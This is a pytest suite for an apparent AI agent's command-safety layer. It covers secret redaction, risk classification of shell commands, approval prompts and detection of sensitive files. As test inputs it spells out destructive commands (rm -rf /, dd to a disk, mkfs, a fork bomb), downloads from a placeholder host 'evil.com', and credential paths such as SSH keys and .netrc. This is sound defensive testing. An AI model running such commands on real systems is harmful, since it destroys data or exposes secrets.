"""
Tests for core/safety.py — 100% branch coverage for SafetyLayer and standalone functions.
"""

import json
import os
import re
from pathlib import Path
from unittest.mock import patch, MagicMock, PropertyMock

import pytest


# ===================================================================
# SafetyLayer.sanitize_text
# ===================================================================
class TestSanitizeText:
    """Cover all SENSITIVE_PATTERNS: API Key, DeepSeek Key, OpenAI Key,
    JWT Token, Authorization Header, Private Key, 密码明文."""

    def test_plain_text_unchanged(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.sanitize_text("hello world") == "hello world"

    def test_empty_string(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.sanitize_text("") == ""

    def test_api_key_pattern(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("api_key=abcdef1234567890")
        assert "[API Key:***]" in result

    def test_api_key_variant(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("APIKEY=abcdef1234567890")
        assert "[API Key:***]" in result

    def test_deepseek_key(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        assert "[DeepSeek Key:***]" in result

    def test_openai_key(self):
        from core.safety import SafetyLayer
        # Both DeepSeek and OpenAI use the same regex (sk-*), so we test it matches
        result = SafetyLayer.sanitize_text("sk-abcdefghijklmnopqrstuvwxyz")
        assert "[DeepSeek Key:***]" in result or "[OpenAI Key:***]" in result

    def test_jwt_token(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text(
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dkjfhakjdhfkjahdjkfhakjdhf"
        )
        assert "[JWT Token:***]" in result

    def test_authorization_header(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text(
            "Authorization: Bearer abcdefghijklmnopqrstuvwxyz1234567890"
        )
        assert "[Authorization Header:***]" in result

    def test_private_key(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("-----BEGIN PRIVATE KEY-----")
        assert "[Private Key:***]" in result

    def test_private_key_rsa(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("-----BEGIN RSA PRIVATE KEY-----")
        assert "[Private Key:***]" in result

    def test_password_plaintext(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("password=hunter2")
        assert "[密码明文:***]" in result

    def test_password_variant(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("PASSWORD=supersecret123")
        assert "[密码明文:***]" in result

    def test_case_insensitive_api_key(self):
        from core.safety import SafetyLayer
        result = SafetyLayer.sanitize_text("API_Key=abcdefgh12345678")
        assert "[API Key:***]" in result

    def test_multiple_sensitive_items(self):
        from core.safety import SafetyLayer
        text = "api_key=secret123 and sk-xxxxxxxxxxxxxxxxxxxxxx and password=abc123"
        result = SafetyLayer.sanitize_text(text)
        assert "[API Key:***]" in result
        assert "[DeepSeek Key:***]" in result
        assert "[密码明文:***]" in result


# ===================================================================
# SafetyLayer.sanitize_dict
# ===================================================================
class TestSanitizeDict:
    """Cover every branch: str value, dict value, list value, other value."""

    def test_string_value(self):
        from core.safety import SafetyLayer
        data = {"key": "password=hunter2"}
        result = SafetyLayer.sanitize_dict(data)
        assert "[密码明文:***]" in result["key"]

    def test_nested_dict(self):
        from core.safety import SafetyLayer
        data = {"outer": {"inner": "api_key=abcdef1234567890"}}
        result = SafetyLayer.sanitize_dict(data)
        assert "[API Key:***]" in result["outer"]["inner"]

    def test_list_of_strings(self):
        from core.safety import SafetyLayer
        data = {"items": ["safe", "password=test123"]}
        result = SafetyLayer.sanitize_dict(data)
        assert result["items"][0] == "safe"
        assert "[密码明文:***]" in result["items"][1]

    def test_list_of_dicts(self):
        from core.safety import SafetyLayer
        data = {"items": [{"secret": "api_key=abcdef1234567890"}]}
        result = SafetyLayer.sanitize_dict(data)
        assert "[API Key:***]" in result["items"][0]["secret"]

    def test_list_mixed_types(self):
        from core.safety import SafetyLayer
        data = {"items": ["text", {"nested": "sk-xxxxxxxxxxxxxxxxxxxxxx"}, 42]}
        result = SafetyLayer.sanitize_dict(data)
        assert result["items"][0] == "text"
        assert "[DeepSeek Key:***]" in result["items"][1]["nested"]
        assert result["items"][2] == 42

    def test_non_string_non_dict_value(self):
        from core.safety import SafetyLayer
        data = {"a": 123, "b": 3.14, "c": True, "d": None}
        result = SafetyLayer.sanitize_dict(data)
        assert result == data

    def test_empty_dict(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.sanitize_dict({}) == {}

    def test_list_of_other_types(self):
        from core.safety import SafetyLayer
        data = {"nums": [1, 2, 3]}
        result = SafetyLayer.sanitize_dict(data)
        assert result["nums"] == [1, 2, 3]


# ===================================================================
# SafetyLayer.sanitize_command
# ===================================================================
class TestSanitizeCommand:
    """Cover Bearer token and --api-key / sk- patterns."""

    def test_bearer_token(self):
        from core.safety import SafetyLayer
        cmd = 'curl -H "Authorization: Bearer abcdefghijklmnopqrstuvwxyz1234567890"'
        result = SafetyLayer.sanitize_command(cmd)
        assert "Bearer [***]" in result
        assert "abcdefghijklmnopqrstuvwxyz1234567890" not in result

    def test_short_bearer_not_matched(self):
        from core.safety import SafetyLayer
        # Bearer tokens shorter than 20 chars should not be replaced
        cmd = 'curl -H "Authorization: Bearer short"'
        result = SafetyLayer.sanitize_command(cmd)
        assert "Bearer short" in result

    def test_api_key_param(self):
        from core.safety import SafetyLayer
        cmd = "python script.py --api-key sk-abcdef123456"
        result = SafetyLayer.sanitize_command(cmd)
        # The replacement captures the --api-key part and appends [***]
        assert "[***]" in result

    def test_sk_param(self):
        from core.safety import SafetyLayer
        cmd = "cmd --api-key=sk-xxxxxxxxxxxxxxxxxxxxxx"
        result = SafetyLayer.sanitize_command(cmd)
        assert "[***]" in result

    def test_no_sensitive_info(self):
        from core.safety import SafetyLayer
        cmd = "ls -la"
        assert SafetyLayer.sanitize_command(cmd) == cmd

    def test_empty_command(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.sanitize_command("") == ""


# ===================================================================
# SafetyLayer.classify_command
# ===================================================================
class TestClassifyCommand:
    """Cover: locked command (FORBIDDEN), dangerous patterns (DANGEROUS/ATTENTION),
    harmless read-only patterns (SAFE), and fallback (SAFE)."""

    def test_forbidden_locked_command(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer, CommandLevel, ROOT_DIR
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        lockfile = tmp_path / ".safety-lock"
        lockfile.write_text("rm -rf /\n")
        level, risk, reason = SafetyLayer.classify_command("rm -rf /home")
        assert level == CommandLevel.FORBIDDEN
        assert risk == "锁定命令"
        assert "安全锁禁止" in reason

    def test_forbidden_blank_lines_in_lockfile(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer, CommandLevel, ROOT_DIR
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        lockfile = tmp_path / ".safety-lock"
        lockfile.write_text("\n\npip install\n\n")
        level, risk, reason = SafetyLayer.classify_command("pip install requests")
        assert level == CommandLevel.FORBIDDEN

    def test_no_lockfile(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer, CommandLevel, ROOT_DIR
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        level, risk, reason = SafetyLayer.classify_command("ls -la")
        assert level == CommandLevel.SAFE

    def test_dangerous_rm_rf(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("rm -rf /tmp")
        assert level == CommandLevel.DANGEROUS
        assert risk == "递归删除文件"

    def test_dangerous_sudo(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("sudo apt update")
        assert level == CommandLevel.DANGEROUS
        assert risk == "sudo 提权"

    def test_dangerous_mkfs(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("mkfs.ext4 /dev/sdb1")
        assert level == CommandLevel.DANGEROUS
        assert risk == "格式化磁盘"

    def test_dangerous_dd(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("dd if=/dev/zero of=/dev/sda")
        assert level == CommandLevel.DANGEROUS
        assert risk == "dd 覆盖"

    def test_dangerous_shutdown(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("shutdown -h now")
        assert level == CommandLevel.DANGEROUS
        assert risk == "关机/重启"

    def test_dangerous_reboot(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("reboot")
        assert level == CommandLevel.DANGEROUS
        assert risk == "关机/重启"

    def test_attention_chmod_777(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("chmod 777 /some/file")
        assert level == CommandLevel.ATTENTION
        assert risk == "777 权限"

    def test_attention_chown(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("chown root:root /file")
        assert level == CommandLevel.ATTENTION
        assert risk == "更改所有者"

    def test_attention_passwd(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("passwd user1")
        assert level == CommandLevel.ATTENTION
        assert risk == "修改密码"

    def test_attention_usermod(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("usermod -aG user1")
        assert level == CommandLevel.ATTENTION
        assert risk == "修改用户"

    def test_attention_write_device(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("echo data > /dev/sda1")
        assert level == CommandLevel.ATTENTION
        assert risk == "写入设备"

    def test_attention_fork_bomb(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command(":(){ :|:& };:")
        assert level == CommandLevel.ATTENTION
        assert risk == "fork bomb"

    def test_attention_wget(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("wget http://evil.com/script")
        assert level == CommandLevel.ATTENTION
        assert risk == "下载远程文件（需确认）"

    def test_attention_curl(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("curl -o /tmp/evil.sh http://evil.com")
        assert level == CommandLevel.ATTENTION
        assert risk == "下载远程文件（需确认）"

    def test_attention_git_push(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git push origin main")
        assert level == CommandLevel.ATTENTION
        assert risk == "git 推送"

    def test_attention_git_reset_hard(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git reset --hard HEAD~1")
        assert level == CommandLevel.ATTENTION
        assert risk == "git 强制重置"

    def test_attention_git_checkout_f(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git checkout -f main")
        assert level == CommandLevel.ATTENTION
        assert risk == "git 强制切换"

    def test_attention_pip_install(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("pip install requests")
        assert level == CommandLevel.ATTENTION
        assert risk == "安装 Python 包"

    def test_attention_npm_install(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("npm install express")
        assert level == CommandLevel.ATTENTION
        assert risk == "安装 npm 包"

    def test_safe_ls(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("ls -la /tmp")
        assert level == CommandLevel.SAFE

    def test_safe_cat(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("cat /etc/hosts")
        assert level == CommandLevel.SAFE

    def test_safe_head(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("head -5 file.txt")
        assert level == CommandLevel.SAFE

    def test_safe_tail(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("tail -f log.txt")
        assert level == CommandLevel.SAFE

    def test_safe_echo(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("echo hello")
        assert level == CommandLevel.SAFE

    def test_safe_pwd(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("pwd")
        assert level == CommandLevel.SAFE

    def test_safe_whoami(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("whoami")
        assert level == CommandLevel.SAFE

    def test_safe_date(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("date")
        assert level == CommandLevel.SAFE

    def test_safe_uptime(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("uptime")
        assert level == CommandLevel.SAFE

    def test_safe_df(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("df -h")
        assert level == CommandLevel.SAFE

    def test_safe_du(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("du -sh /home")
        assert level == CommandLevel.SAFE

    def test_safe_free(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("free -m")
        assert level == CommandLevel.SAFE

    def test_safe_ps(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("ps aux")
        assert level == CommandLevel.SAFE

    def test_safe_git_status(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git status")
        assert level == CommandLevel.SAFE

    def test_safe_git_diff(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git diff")
        assert level == CommandLevel.SAFE

    def test_safe_git_log(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git log --oneline")
        assert level == CommandLevel.SAFE

    def test_safe_git_show(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git show HEAD")
        assert level == CommandLevel.SAFE

    def test_safe_git_branch(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("git branch")
        assert level == CommandLevel.SAFE

    def test_safe_python_c(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("python3 -c 'print(1)'")
        assert level == CommandLevel.SAFE

    def test_safe_python_V(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("python3 --version")
        assert level == CommandLevel.SAFE

    def test_safe_fallback(self):
        from core.safety import SafetyLayer, CommandLevel
        level, risk, reason = SafetyLayer.classify_command("some random command")
        assert level == CommandLevel.ATTENTION


# ===================================================================
# SafetyLayer.needs_approval
# ===================================================================
class TestNeedsApproval:
    def test_attention_true(self):
        from core.safety import SafetyLayer, CommandLevel
        assert SafetyLayer.needs_approval(CommandLevel.ATTENTION) is True

    def test_dangerous_true(self):
        from core.safety import SafetyLayer, CommandLevel
        assert SafetyLayer.needs_approval(CommandLevel.DANGEROUS) is True

    def test_safe_false(self):
        from core.safety import SafetyLayer, CommandLevel
        assert SafetyLayer.needs_approval(CommandLevel.SAFE) is False

    def test_forbidden_false(self):
        from core.safety import SafetyLayer, CommandLevel
        assert SafetyLayer.needs_approval(CommandLevel.FORBIDDEN) is False

    def test_empty_string_false(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.needs_approval("") is False


# ===================================================================
# SafetyLayer.needs_approval_with_denial
# ===================================================================
class TestNeedsApprovalWithDenial:
    """Cover: level not attention/dangerous, denial allows, denial blocks, default ask."""

    def test_safe_level_returns_allow(self):
        from core.safety import SafetyLayer, CommandLevel
        result = SafetyLayer.needs_approval_with_denial(CommandLevel.SAFE, "ls")
        assert result == (False, "allow")

    def test_forbidden_level_returns_allow(self):
        from core.safety import SafetyLayer, CommandLevel
        result = SafetyLayer.needs_approval_with_denial(CommandLevel.FORBIDDEN, "rm -rf")
        assert result == (False, "allow")

    def test_denial_allow_decision(self, monkeypatch):
        from core.safety import SafetyLayer, CommandLevel
        mock_tracker = MagicMock()
        mock_tracker.get_decision.return_value = "allow"
        monkeypatch.setattr(SafetyLayer, "denial_tracker", mock_tracker)
        result = SafetyLayer.needs_approval_with_denial(CommandLevel.DANGEROUS, "pip install")
        assert result == (False, "allow")

    def test_denial_block_decision(self, monkeypatch):
        from core.safety import SafetyLayer, CommandLevel
        mock_tracker = MagicMock()
        mock_tracker.get_decision.return_value = "block"
        monkeypatch.setattr(SafetyLayer, "denial_tracker", mock_tracker)
        result = SafetyLayer.needs_approval_with_denial(CommandLevel.ATTENTION, "pip install")
        assert result == (False, "block")

    def test_denial_ask_decision(self, monkeypatch):
        from core.safety import SafetyLayer, CommandLevel
        mock_tracker = MagicMock()
        mock_tracker.get_decision.return_value = "ask"
        monkeypatch.setattr(SafetyLayer, "denial_tracker", mock_tracker)
        result = SafetyLayer.needs_approval_with_denial(CommandLevel.DANGEROUS, "pip install")
        assert result == (True, "ask")


# ===================================================================
# SafetyLayer.report_denial / report_approval
# ===================================================================
class TestReportDenialApproval:
    def test_report_denial(self, monkeypatch):
        from core.safety import SafetyLayer
        mock_tracker = MagicMock()
        monkeypatch.setattr(SafetyLayer, "denial_tracker", mock_tracker)
        SafetyLayer.report_denial("pip install")
        mock_tracker.record_denial.assert_called_once_with("pip install")

    def test_report_approval(self, monkeypatch):
        from core.safety import SafetyLayer
        mock_tracker = MagicMock()
        monkeypatch.setattr(SafetyLayer, "denial_tracker", mock_tracker)
        SafetyLayer.report_approval("sudo rm")
        mock_tracker.record_approval.assert_called_once_with("sudo rm")


# ===================================================================
# SafetyLayer.get_approval_message
# ===================================================================
class TestGetApprovalMessage:
    """Cover DANGEROUS, ATTENTION, and other levels (return None)."""

    def test_dangerous_message(self):
        from core.safety import SafetyLayer, CommandLevel
        msg = SafetyLayer.get_approval_message(
            CommandLevel.DANGEROUS, "递归删除文件", "rm -rf /"
        )
        assert msg is not None
        assert "高风险操作" in msg
        assert "递归删除文件" in msg
        assert "rm -rf /" in msg

    def test_attention_message(self):
        from core.safety import SafetyLayer, CommandLevel
        msg = SafetyLayer.get_approval_message(
            CommandLevel.ATTENTION, "pip 安装", "pip install requests"
        )
        assert msg is not None
        assert "需确认操作" in msg
        assert "pip 安装" in msg
        assert "pip install requests" in msg

    def test_safe_no_message(self):
        from core.safety import SafetyLayer, CommandLevel
        assert SafetyLayer.get_approval_message(CommandLevel.SAFE, "", "") is None

    def test_forbidden_no_message(self):
        from core.safety import SafetyLayer, CommandLevel
        assert SafetyLayer.get_approval_message(CommandLevel.FORBIDDEN, "", "") is None

    def test_unknown_level_no_message(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.get_approval_message("unknown", "", "") is None


# ===================================================================
# SafetyLayer.is_path_sanitized
# ===================================================================
class TestIsPathSanitized:
    """Cover all sensitive file patterns."""

    def test_env_file(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/project/.env") is True

    def test_id_rsa(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/.ssh/id_rsa") is True

    def test_id_ed25519(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/.ssh/id_ed25519") is True

    def test_ssh_dir(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/.ssh/authorized_keys") is True

    def test_credentials(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/etc/credentials.txt") is True

    def test_secret(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/etc/secret.key") is True

    def test_token(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/tmp/token.txt") is True

    def test_netrc(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/.netrc") is True

    def test_npmrc(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/.npmrc") is True

    def test_docker_config(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/.docker/config.json") is True

    def test_safe_path(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/home/user/Documents/report.pdf") is False

    def test_empty_path(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("") is False

    def test_case_insensitive(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_path_sanitized("/PROJECT/.ENV") is True


# ===================================================================
# SafetyLayer.is_output_sensitive
# ===================================================================
class TestIsOutputSensitive:
    def test_sensitive_api_key(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_output_sensitive("api_key=abcdef1234567890") is True

    def test_sensitive_jwt(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_output_sensitive(
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNqP7bGj6lPZ0QyQ"
        ) is True

    def test_sensitive_private_key(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_output_sensitive(
            "-----BEGIN PRIVATE KEY-----"
        ) is True

    def test_sensitive_password(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_output_sensitive("password=hunter2") is True

    def test_plain_text_false(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_output_sensitive("hello world") is False

    def test_empty_string(self):
        from core.safety import SafetyLayer
        assert SafetyLayer.is_output_sensitive("") is False


# ===================================================================
# SafetyLayer.get_safety_summary
# ===================================================================
class TestGetSafetySummary:
    def test_with_locked_commands(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        lockfile = tmp_path / ".safety-lock"
        lockfile.write_text("rm -rf /\npip install\n")
        summary = SafetyLayer.get_safety_summary()
        assert "rm -rf /" in summary["locked_commands"]
        assert "pip install" in summary["locked_commands"]
        assert summary["sensitive_patterns_active"] > 0
        assert "denial_tracking" in summary

    def test_no_lockfile(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        summary = SafetyLayer.get_safety_summary()
        assert summary["locked_commands"] == []
        assert summary["sensitive_patterns_active"] > 0

    def test_structure(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        summary = SafetyLayer.get_safety_summary()
        assert "locked_commands" in summary
        assert "sensitive_patterns_active" in summary
        assert "command_classification" in summary
        assert "sanitization" in summary
        assert "denial_tracking" in summary


# ===================================================================
# SafetyLayer.lock_command / unlock_command
# ===================================================================
class TestLockUnlockCommand:
    def test_lock_new_command(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        result = SafetyLayer.lock_command("rm -rf /")
        assert result is True
        lockfile = tmp_path / ".safety-lock"
        assert lockfile.exists()
        content = lockfile.read_text()
        assert "rm -rf /" in content

    def test_lock_duplicate(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        SafetyLayer.lock_command("rm -rf /")
        result = SafetyLayer.lock_command("rm -rf /")
        assert result is False

    def test_lock_multiple_commands(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        SafetyLayer.lock_command("rm -rf /")
        SafetyLayer.lock_command("pip install")
        lockfile = tmp_path / ".safety-lock"
        content = lockfile.read_text()
        assert "rm -rf /" in content
        assert "pip install" in content
        # Should be sorted
        lines = [l.strip() for l in content.strip().split("\n") if l.strip()]
        assert lines == sorted(lines)

    def test_unlock_existing(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        SafetyLayer.lock_command("rm -rf /")
        result = SafetyLayer.unlock_command("rm -rf /")
        assert result is True
        lockfile = tmp_path / ".safety-lock"
        content = lockfile.read_text()
        assert "rm -rf /" not in content

    def test_unlock_nonexistent(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        result = SafetyLayer.unlock_command("rm -rf /")
        assert result is False

    def test_unlock_no_lockfile(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        result = SafetyLayer.unlock_command("nothing")
        assert result is False

    def test_unlock_not_in_list(self, tmp_path, monkeypatch):
        from core.safety import SafetyLayer
        monkeypatch.setattr("core.safety.ROOT_DIR", tmp_path)
        SafetyLayer.lock_command("pip install")
        result = SafetyLayer.unlock_command("rm -rf /")
        assert result is False


# ===================================================================
# Standalone functions: sanitize_* (re-export wrappers if any) + others
# ===================================================================
class TestStandaloneSanitizeFunctions:
    """Test sanitize_text, sanitize_dict, sanitize_command as module-level aliases
    (if they exist in the module)."""

    def test_sanitize_text_exists(self):
        import core.safety
        # If the module exposes sanitize_text as a standalone function
        if hasattr(core.safety, "sanitize_text"):
            result = core.safety.sanitize_text("password=test")
            assert "[密码明文:***]" in result

    def test_sanitize_dict_exists(self):
        import core.safety
        if hasattr(core.safety, "sanitize_dict"):
            result = core.safety.sanitize_dict({"x": "password=test"})
            assert "[密码明文:***]" in result["x"]

    def test_sanitize_command_exists(self):
        import core.safety
        if hasattr(core.safety, "sanitize_command"):
            result = core.safety.sanitize_command("--api-key sk-xxx")
            assert "[***]" in result


class TestStandaloneClassifyCommand:
    def test_classify_command_exists(self):
        import core.safety
        if hasattr(core.safety, "classify_command"):
            level, risk, reason = core.safety.classify_command("ls")
            from core.safety import CommandLevel
            assert level == CommandLevel.SAFE


class TestStandaloneNeedsApproval:
    def test_needs_approval_exists(self):
        import core.safety
        if hasattr(core.safety, "needs_approval"):
            from core.safety import CommandLevel
            assert core.safety.needs_approval(CommandLevel.DANGEROUS) is True


class TestStandaloneReportDenialApproval:
    def test_report_denial_exists(self, monkeypatch):
        import core.safety
        if hasattr(core.safety, "report_denial"):
            mock = MagicMock()
            monkeypatch.setattr(core.safety.SafetyLayer, "denial_tracker", mock)
            core.safety.report_denial("test")
            mock.record_denial.assert_called_once()

    def test_report_approval_exists(self, monkeypatch):
        import core.safety
        if hasattr(core.safety, "report_approval"):
            mock = MagicMock()
            monkeypatch.setattr(core.safety.SafetyLayer, "denial_tracker", mock)
            core.safety.report_approval("test")
            mock.record_approval.assert_called_once()


class TestStandaloneGetApprovalMessage:
    def test_get_approval_message_exists(self):
        import core.safety
        if hasattr(core.safety, "get_approval_message"):
            from core.safety import CommandLevel
            msg = core.safety.get_approval_message(CommandLevel.DANGEROUS, "x", "y")
            assert msg is not None


class TestStandaloneIsPathSanitized:
    def test_is_path_sanitized_exists(self):
        import core.safety
        if hasattr(core.safety, "is_path_sanitized"):
            assert core.safety.is_path_sanitized("/.env") is True


class TestStandaloneIsOutputSensitive:
    def test_is_output_sensitive_exists(self):
        import core.safety
        if hasattr(core.safety, "is_output_sensitive"):
            assert core.safety.is_output_sensitive("password=x") is True


class TestStandaloneGetSafetySummary:
    def test_get_safety_summary_exists(self, tmp_path, monkeypatch):
        import core.safety
        if hasattr(core.safety, "get_safety_summary"):
            monkeypatch.setattr(core.safety, "ROOT_DIR", tmp_path)
            summary = core.safety.get_safety_summary()
            assert "locked_commands" in summary


class TestStandaloneLockUnlock:
    def test_lock_unlock_exist(self, tmp_path, monkeypatch):
        import core.safety
        if hasattr(core.safety, "lock_command"):
            monkeypatch.setattr(core.safety, "ROOT_DIR", tmp_path)
            assert core.safety.lock_command("test") is True
            assert core.safety.unlock_command("test") is True
